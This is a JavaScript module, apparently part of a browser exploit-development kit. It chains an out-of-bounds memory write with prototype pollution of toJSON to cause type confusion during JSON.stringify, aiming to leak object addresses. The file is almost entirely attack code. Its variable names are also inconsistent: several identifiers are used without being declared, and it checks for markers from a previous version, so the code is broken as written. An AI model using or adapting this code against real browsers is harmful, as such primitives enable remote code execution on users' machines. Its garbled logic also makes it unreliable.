// js/script3/testArrayBufferVictimCrash.mjs (v80_LeakAddressViaGetterOnM2)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V80_LAGM = "OriginalHeisenbug_TypedArrayAddrof_v80_LeakAddrGetterM2";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUES_V80 = [0xFFFFFFFF, 0x7FFFFFFF]; 

let object_to_leak_A_v80 = null;
let object_to_leak_B_v80 = null;
let victim_typed_array_ref_v80 = null; 
let probe_call_count_v80 = 0;
let marker_M1_ref_v80 = null; 
let marker_M2_ref_v80 = null; 
// Armazena os detalhes da Call #2, onde M2 é 'this' e é confuso
let details_M2_as_confused_this_v80 = null; 
const PROBE_CALL_LIMIT_V80 = 5; 


function toJSON_TA_Probe_LeakAddrGetterM2() {
    probe_call_count_v80++;
    const call_num = probe_call_count_v80;
    let current_call_log_info = {
        call_number: call_num,
        probe_variant: FNAME_MODULE_TYPEDARRAY_ADDROF_V80_LAGM,
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v80),
        this_is_M1: (this === marker_M1_ref_v80 && marker_M1_ref_v80 !== null),
        this_is_M2: (this === marker_M2_ref_v80 && marker_M2_ref_v80 !== null),
        m2_interaction: { getter_defined: false, direct_prop_set: false, error: null },
        error_in_probe: null
    };
    logS3(`[PROBE_V80] Call #${call_num}. 'this': ${current_call_log_info.this_type}. IsVictim? ${current_call_log_info.this_is_victim}. IsM1? ${current_call_log_info.this_is_M1}. IsM2? ${current_call_log_info.this_is_M2}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V80) {
            logS3(`[PROBE_V80] Call #${call_num}: Probe limit. Stop.`, "warn");
            if (!details_of_M2_as_confused_this_v80) details_of_M2_as_confused_this_v80 = current_call_log_info;
            return { recursion_stopped_v80: true };
        }

        if (call_num === 1 && current_call_log_info.this_is_victim) {
            logS3(`[PROBE_V80] Call #${call_num}: 'this' is victim. Returning M1 (which will contain M2).`, "info");
            marker_M2_ref_v80 = { marker_id_v80: "M2_TARGET_V80" }; // M2 é criado primeiro
            marker_M1_ref_v80 = { marker_id_v80: "M1_CONTAINER_V80", payload_M2: marker_M2_ref_v80 };
            if (!details_of_M2_as_confused_this_v80) details_of_M2_as_confused_this_v80 = current_call_log_info;
            return marker_M1_ref_v80;
        } else if (call_num === 2 && current_call_log_info.this_is_M2) {
            logS3(`[PROBE_V80] Call #${call_num}: 'this' IS M2. Current type: ${current_call_log_info.this_type}. Checking for TC...`, "critical");
            details_of_M2_as_confused_this_v80 = current_call_log_info; // Captura este estado
            
            if (current_call_log_info.this_type === '[object Object]') { 
                logS3(`[PROBE_V80] Call #${call_num}: TYPE CONFUSION ON M2 ('this')! Defining getter & prop...`, "vuln");
                
                Object.defineProperty(this, 'leaky_A_via_getter', {
                    get: function() {
                        logS3(`[PROBE_V80] !!! Getter 'leaky_A_via_getter' on confused M2 (this call #${call_num}) FIRED !!!`, "vuln");
                        // Tentar retornar o objeto diretamente. A esperança é que JSON.stringify
                        // o serialize como um número (endereço) devido ao estado confuso de 'this' (M2).
                        return object_to_leak_A_v80; 
                    }, enumerable: true, configurable: true
                });
                current_call_log_info.m2_interaction.getter_defined = true;
                
                this.leaky_B_via_direct = object_to_leak_B_v80;
                current_call_log_info.m2_interaction.direct_prop_set = true;
                logS3(`[PROBE_V80] Call #${call_num}: Getter and direct prop set on M2 ('this'). Keys: ${Object.keys(this).join(',')}`, "info");
            } else {
                 logS3(`[PROBE_V80] Call #${call_num}: M2 ('this') was NOT [object Object]. Type: ${current_call_log_info.this_type}`, "warn");
            }
            return this; // Retorna M2 (potencialmente modificado)
        } else {
             logS3(`[PROBE_V80] Call #${call_num}: Unexpected 'this' or sequence. Type: ${current_call_log_info.this_type}`, "dev_verbose");
             if (!details_of_M2_as_confused_this_v80 || call_num > (details_of_M2_as_confused_this_v80.call_number || 0) ) {
                if(current_call_log_info.this_type === '[object Object]') details_of_M2_as_confused_this_v80 = current_call_log_info; // Captura se um TC inesperado acontecer
             }
        }
    } catch (e) {
        current_call_log_info.error_in_probe = e.message;
        logS3(`[PROBE_V80] Call #${call_num}: ERROR in probe: ${e.name} - ${e.message}`, "error");
        if (!details_of_M2_as_confused_this_v80 || call_num >= (details_of_M2_as_confused_this_v80.call_number || 0) ) {
            details_of_M2_as_confused_this_v80 = current_call_log_info;
        }
    }
    
    return { generic_marker_v80: call_num }; 
}


export async function executeTypedArrayVictimAddrofTest_LeakAddressViaGetterOnM2() {
    const FNAME_CURRENT_TEST_BASE = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V80_LAGM}`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST_BASE}: Heisenbug (LeakAddressViaGetterOnM2) & Addrof ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V80_LAGM} Init...`;

    let overall_results = [];

    for (const current_oob_value of OOB_WRITE_VALUES_V80) {
        const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_Val${toHex(current_oob_value)}`;
        logS3(`\n===== ITERATION: OOB Write Value: ${toHex(current_oob_value)} =====`, "subtest", FNAME_CURRENT_ITERATION);

        probe_call_count_v80 = 0;
        victim_typed_array_ref_v80 = null; 
        marker_M1_ref_v80 = null;
        marker_M2_ref_v80 = null;
        details_of_M2_as_confused_this_v80 = null;
        object_to_leak_A_v80 = { marker_A_v80: `LeakA_Val${toHex(current_oob_value)}`, idA: Date.now() }; 
        object_to_leak_B_v80 = { marker_B_v80: `LeakB_Val${toHex(current_oob_value)}`, idB: Date.now() + 1 };

        let iterError = null;
        let stringifyOutput_parsed = null; 
        
        let addrof_Getter_A = { success: false, msg: "M2.leaky_A_getter: Default"};
        let addrof_Direct_B = { success: false, msg: "M2.leaky_B_direct: Default"};

        const fillPattern = 0.80808080808080;

        try {
            await triggerOOB_primitive({ force_reinit: true });
            oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, current_oob_value, 4);
            logS3(`  OOB Write: offset ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)}, value ${toHex(current_oob_value)} done.`, "info", FNAME_CURRENT_ITERATION);
            await PAUSE_S3(100);

            victim_typed_array_ref_v80 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
            logS3(`STEP 2: victim_typed_array_ref_v80 (Uint8Array) created.`, "test", FNAME_CURRENT_ITERATION);
            
            const ppKey = 'toJSON';
            let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
            let pollutionApplied = false;

            try {
                Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_LeakAddrGetterM2, writable: true, configurable: true, enumerable: false });
                pollutionApplied = true;
                let rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v80); 
                logS3(`  JSON.stringify completed for iter Val${toHex(current_oob_value)}. Raw Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_ITERATION);
                try { stringifyOutput_parsed = JSON.parse(rawStringifyOutput); } catch (e_parse) { stringifyOutput_parsed = { error_parsing_stringify_output: rawStringifyOutput, parse_error: e_parse.message };}
                
                // details_of_M2_as_confused_this_v80 é o current_call_details da sonda P2 (onde this=M2)
                logS3(`  EXECUTE: Details of M2 interaction (Call #2): ${details_of_M2_as_confused_this_v80 ? JSON.stringify(details_of_M2_as_confused_this_v80) : 'N/A (M2 not 'this' in P2, or P2 not reached)'}`, "leak", FNAME_CURRENT_ITERATION);

                let heisenbugOnM2 = false;
                if (details_of_M2_as_confused_this_v80 && 
                    details_of_M2_as_confused_this_v80.this_is_M2 &&
                    details_of_M2_as_confused_this_v80.this_type === "[object Object]") {
                    heisenbugOnM2 = true;
                }
                logS3(`  EXECUTE: Heisenbug on M2 Target ${heisenbugOnM2 ? "CONFIRMED" : "NOT Confirmed"}.`, heisenbugOnM2 ? "vuln" : "error", FNAME_CURRENT_ITERATION);
                    
                // Checar stringifyOutput_parsed.payload_M2.leaky_A_getter e leaky_B_direct
                if (stringifyOutput_parsed && stringifyOutput_parsed.marker_id_v79 === "M1_V79_Container" && stringifyOutput_parsed.payload_M2) {
                    const M2_serialized = stringifyOutput_parsed.payload_M2;
                    logS3("   stringifyOutput_parsed is M1 containing M2. Checking M2 content:", "info", FNAME_CURRENT_ITERATION);
                    logS3(`     M2_serialized: ${JSON.stringify(M2_serialized)}`, "leak");

                    const val_getter = M2_serialized.leaky_A_getter;
                    if (typeof val_getter === 'number' && val_getter !==0 && !isNaN(val_getter)) {
                        let getter_int64 = new AdvancedInt64(0,0); // Placeholder
                        try { // Handle potential NaN if conversion fails
                            let temp_buf_getter = new ArrayBuffer(8); new Float64Array(temp_buf_getter)[0] = val_getter;
                            getter_int64 = new AdvancedInt64(new Uint32Array(temp_buf_getter)[0], new Uint32Array(temp_buf_getter)[1]);
                        } catch(e_adv) {}

                        if ((getter_int64.high() > 0 && getter_int64.high() < 0x000F0000) || (getter_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
                           addrof_M2_Getter.success = true; addrof_M2_Getter.msg = `Possible pointer from M2.leaky_A_getter: ${getter_int64.toString(true)}`;
                        } else { addrof_M2_Getter.msg = `M2.leaky_A_getter is num but not ptr: ${val_getter} (${getter_int64.toString(true)})`; }
                    } else { addrof_M2_Getter.msg = `M2.leaky_A_getter not useful num. Val: ${JSON.stringify(val_getter)}`; }

                    const val_direct = M2_serialized.leaky_B_direct;
                     if (typeof val_direct === 'number' && val_direct !==0 && !isNaN(val_direct)) {
                        let direct_int64 = new AdvancedInt64(0,0); try{let tbd=new ArrayBuffer(8);new Float64Array(tbd)[0]=val_direct;direct_int64=new AdvancedInt64(new Uint32Array(tbd)[0],new Uint32Array(tbd)[1]);}catch(e_adv){}
                         if ((direct_int64.high() > 0 && direct_int64.high() < 0x000F0000) || (direct_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
                           addrof_M2_Direct.success = true; addrof_M2_Direct.msg = `Possible pointer from M2.leaky_B_direct: ${direct_int64.toString(true)}`;
                        } else { addrof_M2_Direct.msg = `M2.leaky_B_direct is num but not ptr: ${val_direct} (${direct_int64.toString(true)})`; }
                    } else { addrof_M2_Direct.msg = `M2.leaky_B_direct not useful num. Val: ${JSON.stringify(val_direct)}`; }
                } else {
                    addrof_M2_Getter.msg = "M2 not found in stringifyOutput_parsed as expected payload of M1.";
                    addrof_M2_Direct.msg = "M2 not found in stringifyOutput_parsed as expected payload of M1.";
                    logS3(`   stringifyOutput_parsed content: ${JSON.stringify(stringifyOutput_parsed)}`, "warn", FNAME_CURRENT_ITERATION);
                }

            } catch (e_str) { iterError = e_str;
            } finally { if (pollutionApplied) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor || { value: null, writable: true, configurable: true, enumerable: false }); }
        } catch (e_outer) { iterError = e_outer;
        } finally { clearOOBEnvironment({force_clear_even_if_not_setup: true}); }
        
        overall_results.push({
            oob_value: toHex(current_oob_value), error: iterError ? `${iterError.name}: ${iterError.message}` : null,
            details_of_M2_probe: details_of_M2_as_confused_this_v80 ? JSON.parse(JSON.stringify(details_of_M2_as_confused_this_v80)) : null, 
            final_stringify_output_parsed_iter: stringifyOutput_parsed,
            addrof_M2_Getter: {...addrof_M2_Getter}, addrof_M2_Direct: {...addrof_M2_Direct},
            probe_calls_this_iter: probe_call_count_v80 
        });
        if (addrof_M2_Getter.success || addrof_M2_Direct.success) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V80_LAGM}: Addr? ${toHex(current_oob_value)} SUCCESS!`;
        }
        await PAUSE_S3(100); 
    } 

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed All Iterations ---`, "test", FNAME_CURRENT_TEST_BASE);
    // ... (Log resumido de overall_results)
    if (!document.title.includes("SUCCESS")) document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V80_LAGM}: All Vals Tested.`;
    
    // ... (Lógica para result_for_runner)
    let result_for_runner = overall_results.find(r => r.addrof_M2_Getter.success || r.addrof_M2_Direct.success);
    if (!result_for_runner && overall_results.length > 0) result_for_runner = overall_results[overall_results.length - 1];

    return { 
        errorOccurred: mainErrorCapturedMain, 
        toJSON_details: result_for_runner ? result_for_runner.details_of_M2_probe : null, 
        stringifyResult: result_for_runner ? result_for_runner.final_stringify_output_parsed_iter : null,
        addrof_A_result: result_for_runner ? result_for_runner.addrof_M2_Getter : addrof_M2_Getter, 
        addrof_B_result: result_for_runner ? result_for_runner.addrof_M2_Direct : addrof_M2_Direct,  
        total_probe_calls: result_for_runner ? result_for_runner.probe_calls_this_iter : 0 
    };
}
